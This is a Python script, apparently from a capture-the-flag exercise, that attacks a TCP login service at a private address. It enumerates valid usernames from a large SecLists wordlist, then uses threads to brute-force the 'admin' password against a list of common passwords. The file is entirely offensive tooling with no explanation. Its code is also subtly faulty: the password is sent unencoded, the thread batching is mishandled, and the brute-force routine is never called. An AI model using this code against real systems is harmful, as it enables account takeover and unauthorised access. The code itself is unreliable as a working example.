import socket
# Define the server's address and port
server_address = ('10.201.88.90', 8000) # Replace with your server's address and port

def send_word(word):
  # Create a socket object
  client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  try:
    # Connect to the server
    client_socket.connect(server_address)
    # Send the word to the server
    client_socket.sendall(word.encode())
    # Receive data from the server (if applicable)
    response = client_socket.recv(1024)
    response = response.decode()
    if not word in response:
      print(f"Sent: {word} | Received: {response}")
  except ConnectionRefusedError:
    print("Connection was refused. Is the server running?")
  finally:
    # Close the socket connection
    client_socket.close()

def read_wordlist_from_file(filename):
  with open(filename, 'r') as file:
    wordlist = file.readlines()
  return [word.strip() for word in wordlist]

# Path to the wordlist file
wordlist_filename = '/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt'
# Read words from the file
words = read_wordlist_from_file(wordlist_filename)
# Iterate through the words and send each one to the server
for word in words:
  send_word(word)


def test_this(password):
  # Create a socket object
  client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  try:
    # Connect to the server
    client_socket.connect(server_address)
    # Send the word to the server
    client_socket.sendall('admin'.encode())
    # Receive data from the server (if applicable)
    response = client_socket.recv(1024)
    response = response.decode()
    if 'Password' in response:
      client_socket.sendall(password)
      response = client_socket.recv(1024)
      response = response.decode()
    if not 'Password' in response:
      print('Password:', password)
  except ConnectionRefusedError:
    print("Connection was refused. Is the server running?")
  finally:
    # Close the socket connection
    client_socket.close()

def test_creds():
  from threading import Thread
  wordlist = '/usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt'
  passwords = read_wordlist_from_file(wordlist)
  threads = []
  for password in passwords:
    thread = Thread(target=test_this, args=(password, ))
    thread.start()
    threads.append(thread)
    if len(threads) >= 30:
      for thread in threads:
        thread.join()
        threads = []
